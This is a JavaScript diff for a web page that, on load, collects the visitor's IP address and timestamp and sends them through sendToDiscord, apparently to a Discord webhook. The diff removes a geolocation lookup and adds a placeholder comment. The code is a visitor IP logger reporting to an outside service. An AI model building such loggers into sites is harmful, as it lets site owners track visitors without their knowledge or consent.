@@ -9,13 +9,8 @@ document.addEventListener('DOMContentLoaded', () => {
       const currentDateTime = new Date();
       const dateTimeString = currentDateTime.toLocaleString();
 
-      fetch(`https://json.geoiplookup.io/${ipAddress}`)
-        .then(response => response.json())
-        .then(geoData => {
-          const message = createMessage(ipAddress, dateTimeString, geoData);
-          sendToDiscord(message);
-        })
-        .catch(error => console.error(error));
+      const message = createMessage(ipAddress, dateTimeString, data);
+      sendToDiscord(message);
 
       document.getElementById('ip-address').textContent = `IP Address: ${ipAddress}`;
       document.getElementById('datetime').textContent = `Date and Time: ${dateTimeString}`;
@@ -28,6 +23,9 @@ document.addEventListener('DOMContentLoaded', () => {
 
   xhr.send();
 });
+
+// Rest of the code remains the same
+// ...
 
 
 function createMessage(ipAddress, dateTimeString, geoData) {
